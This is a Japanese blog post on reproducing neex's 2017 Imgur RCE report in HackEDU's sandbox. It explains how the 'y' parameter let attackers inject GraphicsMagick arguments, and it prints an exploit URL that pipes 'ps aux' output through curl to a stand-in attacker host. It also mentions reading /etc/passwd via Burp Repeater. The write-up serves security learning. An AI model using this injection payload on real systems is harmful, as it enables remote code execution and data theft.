




# HackerOneに報告された脆弱性をHackEDUで再現する

サイバーセキュリティに関する体験型学習サービスを提供する「[HackEDU](https://hackedu.io/)」が[HackerOneと提携し、過去に報告された脆弱性を再現できるサンドボックス環境をリリースした](https://www.hackerone.com/blog/Test-your-hacking-skills-real-world-simulated-bugs)。
HackEDUの無料アカウントを作成するだけで、HackerOneに報告された5つの脆弱性のサンドボックス環境を利用できる。

今回はバグハンターのneex氏が2017年に報告したImgurという画像共有サイトでのRCE（[#212696](https://hackerone.com/reports/212696)）を取り上げる。neex氏が脆弱性を発見した際の手順を再現しながら詳細を学んでいく。

## ImgurでのRCEの再現

HackEDUの利用者はブラウザからサンドボックス環境にアクセスし、ページ内に用意された仮想ブラウザと仮想プロキシを使って脆弱性を再現する。以下のページが[ImgurでのRCEのサンドボックス環境](https://hackedu.io/hacktivity/5f8e247b-98bc-4b7a-aa97-472dcc34a6f8)である。仮想ブラウザ上の1つ目のタブにImgurを再現したImgerというサイトが、2つ目にコールバックを確認するためのタブが開かれている。

![top](https://user-images.githubusercontent.com/5434303/53991342-baa30f80-416d-11e9-8882-70e33c8bccb8.png)

neex氏のレポートによると脆弱性は画像編集機能で見つかっている。Imgurでは画像処理ツールとして人気の高いImageMagickとGraphicsMagickのどちらかが利用されているとneex氏は推測し、どちらのツールにも存在する `-rotate` オプションを用いて調査を始めている。

サンドボックス環境では画像編集時のHTTPリクエストがPOSTメソッドで送られるが、GETメソッドに変更しても問題なく処理される。今回はレポートを忠実に再現するため、仮想プロキシでインターセプトしたHTTPリクエストをGETメソッドに変更した上でパラメータの値を書き換える。

![intercept](https://user-images.githubusercontent.com/5434303/53991381-cdb5df80-416d-11e9-8666-90a50c8471fc.png)

Imgurでは画像編集時に送信される `y` パラメータの値を画像処理ツールのコマンドライン引数に挿入していたため脆弱性が生じた。サンドボックス環境でも `y` パラメータの値に ` -rotate 90` を追加すると画像が90度回転する。

![rotate](https://user-images.githubusercontent.com/5434303/53991406-de665580-416d-11e9-9901-3921ed52caa3.png)

さらなる調査の結果、ImgurではGraphicsMagickが利用されているとneex氏は確信し、`-write` オプションで任意のコマンドを実行できる仕様を用いてRCEを実証した<sup id="f1">[1](#fn1)</sup>。PoCでは `y` パラメータから挿入した `ps` コマンドの実行結果を `curl` コマンドで外部のサーバーへ送信している。

サンドボックス環境では `http://attacker-callback.com:9000` へのコールバックを仮想ブラウザの2つ目のタブで確認できる。2つ目のタブを事前に開いてリッスン状態にしてから、1つ目のタブで以下のURLにアクセスすると `ps` コマンドの実行結果を受け取れる。実際の環境ではスペース（%20）を挿入できなかったためか、neex氏は `${IFS}` を代用して文字を区切っている<sup id="f2">[2](#fn2)</sup>。

http:<span>//imger.com/edit/process?imageid=cd4caa87977d1469cfeedf5cce8e2992.jpg&a=crop&x=95&y=41%20-write%20|ps${IFS}aux|curl${IFS}http:<span>//attacker-callback.com:9000${IFS}-d${IFS}@-&w=768&h=328&random=asdf

![callback](https://user-images.githubusercontent.com/5434303/53991423-ec1bdb00-416d-11e9-8345-4de5bbc8f3b2.png)

## HackEDUでのHTTPリクエストの再送

今回取り上げた脆弱性はGETパラメータでも再現できたため、仮想ブラウザのアドレスバーからパラメータ操作が可能であった。しかしPOSTパラメータでの脆弱性を検証する場合、HTTPリクエストを何度もインターセプトして書き換えることになる。サンドボックス環境の仮想プロキシにはHTTPリクエストの再送機能が搭載されていないため、愛用のローカルプロキシでの再送を試みる。

サンドボックス環境とはいえ仮想ブラウザから発生するHTTPリクエストはHackEDUのサーバーに送信される。そのためサンドボックス環境のページを開いているブラウザでローカルプロキシを経由すればHTTPリクエストを操作できる。例えばBurp SuiteのRepeaterで以下のHTTPリクエストを再送すると、仮想ブラウザの2つ目のタブに `/etc/passwd` の内容が表示される。

![burp](https://user-images.githubusercontent.com/5434303/53991456-fb9b2400-416d-11e9-9a44-c8165269a667.png)

## 所感

脆弱性のレポートを読むだけと、実際に再現まで確認するとでは学びの量が違う。レポートに記載されていない別のパターンを試すことで新たな発見にもつながるし、記憶にも残りやすい。ソフトウェア製品の脆弱性の場合、修正前の古いバージョンを入手できれば再現は可能である。しかしWebアプリケーションの脆弱性の場合、サイト運営者でなければ修正後の再現は極めて難しい。HackEDUのようなサービスにより実在した脆弱性を容易に再現できるようになれば、バグハンターだけでなく開発者の学びにも役立つだろう。

今回は取り上げなかったが、HackEDUはWebアプリケーションの各種脆弱性のサンドボックス環境やCTF形式の問題も提供している。[無料アカウントではSQLインジェクションのみ](https://hackedu.io/demo)だが、脆弱性の再現から各プログラミング言語での修正まで体験できるコースもある。また年間$750の有料アカウントになれば[CVEが割り振られたソフトウェア製品の脆弱性](https://hackedu.io/vulnerabilities)や、バッファオーバーフローのような脆弱性のサンドボックス環境も利用できるようになる。有料アカウントは7日間の無料体験ができるので、まずは試用してから購入を検討したい。

---

<sup id="fn1">[1](#f1)</sup> http://www.graphicsmagick.org/GraphicsMagick.html#details-write  
<sup id="fn2">[2](#f2)</sup> https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution  
